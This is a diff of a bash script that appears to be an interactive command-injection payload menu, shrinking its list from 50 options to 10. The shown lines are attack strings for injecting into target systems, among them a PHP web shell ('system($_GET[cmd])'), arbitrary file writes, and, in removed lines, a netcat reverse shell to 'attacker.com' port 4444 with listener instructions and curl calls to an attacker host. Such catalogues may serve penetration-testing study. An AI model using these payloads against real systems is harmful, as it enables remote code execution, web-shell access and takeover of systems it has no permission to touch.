@@ -602,47 +602,7 @@ command_injection_payloads() {
         echo -e "\e[33m8) PHP System Command Injection (eval)\e[0m"
         echo -e "\e[33m9) Python os.system() Injection\e[0m"
         echo -e "\e[33m10) System File Manipulation via Command Injection\e[0m"
-        echo -e "\e[33m11) Command Injection to Upload a Malicious File\e[0m"
-        echo -e "\e[33m12) Command Injection via CGI Scripts\e[0m"
-        echo -e "\e[33m13) Command Injection with Sudo Privileges\e[0m"
-        echo -e "\e[33m14) Command Injection via FTP Commands\e[0m"
-        echo -e "\e[33m15) Command Injection via SSH Injection\e[0m"
-        echo -e "\e[33m16) Command Injection via Systemd Service\e[0m"
-        echo -e "\e[33m17) Command Injection to Exploit Web Shells\e[0m"
-        echo -e "\e[33m18) Command Injection in Cron Jobs\e[0m"
-        echo -e "\e[33m19) DNS Command Injection\e[0m"
-        echo -e "\e[33m20) Local File Inclusion via Command Injection\e[0m"
-        echo -e "\e[33m21) SQL Injection with Command Execution\e[0m"
-        echo -e "\e[33m22) Remote File Inclusion via Command Injection\e[0m"
-        echo -e "\e[33m23) Command Injection in HTTP Headers\e[0m"
-        echo -e "\e[33m24) Command Injection via Flask Framework (Python)\e[0m"
-        echo -e "\e[33m25) Command Injection via Node.js (child_process)\e[0m"
-        echo -e "\e[33m26) Command Injection in WebSockets\e[0m"
-        echo -e "\e[33m27) Exploiting Shellshock via Command Injection\e[0m"
-        echo -e "\e[33m28) Command Injection via Perl Scripts\e[0m"
-        echo -e "\e[33m29) Command Injection via Ruby Scripts\e[0m"
-        echo -e "\e[33m30) Command Injection with MySQL Exec\e[0m"
-        echo -e "\e[33m31) Command Injection via Bash Function Injection\e[0m"
-        echo -e "\e[33m32) Command Injection in PHP via system() Function\e[0m"
-        echo -e "\e[33m33) Windows Command Injection via CMD\e[0m"
-        echo -e "\e[33m34) Command Injection via Perl system Function\e[0m"
-        echo -e "\e[33m35) Remote Command Execution in WebSockets\e[0m"
-        echo -e "\e[33m36) Command Injection in FTP Client\e[0m"
-        echo -e "\e[33m37) Local Command Execution via File Uploads\e[0m"
-        echo -e "\e[33m38) RCE via HTTP Request Headers\e[0m"
-        echo -e "\e[33m39) Exploit via Nginx Configurations\e[0m"
-        echo -e "\e[33m40) Command Injection via Exim MTA\e[0m"
-        echo -e "\e[33m41) Remote Command Execution via Elasticsearch\e[0m"
-        echo -e "\e[33m42) Command Injection in MongoDB Shell\e[0m"
-        echo -e "\e[33m43) Command Injection via Cloud Function\e[0m"
-        echo -e "\e[33m44) Exploiting Apache Struts Command Injection\e[0m"
-        echo -e "\e[33m45) Command Injection in Redis CLI\e[0m"
-        echo -e "\e[33m46) Command Injection via SQLi with File Inclusion\e[0m"
-        echo -e "\e[33m47) Command Injection via JSON Payloads\e[0m"
-        echo -e "\e[33m48) Command Injection via XML External Entities (XXE)\e[0m"
-        echo -e "\e[33m49) Remote Command Injection via FTP Port 21\e[0m"
-        echo -e "\e[33m50) Command Injection via Tor Network\e[0m"
-        echo -e "\e[33m51) Return to Main Menu\e[0m"
+        echo -e "\e[33m11) Return to Main Menu\e[0m"
         read -p "Select the payload number: " payload_choice
         case $payload_choice in
             1) display_payload "; ls -la" "Basic Command Injection";;
@@ -655,10 +615,7 @@ command_injection_payloads() {
             8) display_payload "; php -r 'system($_GET[\"cmd\"]);'" "PHP System Command Injection (eval)";;
             9) display_payload "; python -c 'import os; os.system(\"ls -la\")'" "Python os.system() Injection";;
             10) display_payload "; echo 'malicious content' > /tmp/malicious_file" "System File Manipulation via Command Injection";;
-            11) display_payload "; curl -X POST -F 'file=@malicious_script.sh' http://target.com/upload" "Command Injection to Upload a Malicious File";;
-            49) display_payload "; nc -e /bin/bash attacker.com 4444" "Remote Command Injection via FTP Port 21 (Run on target) Use listener: \e[36mnc -lvnp 4444\e[0m";;
-            50) display_payload "; curl --silent --show-error http://attacker.com/tor" "Command Injection via Tor Network";;
-            51) return;;
+            11) return;;
             *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
         esac
     done
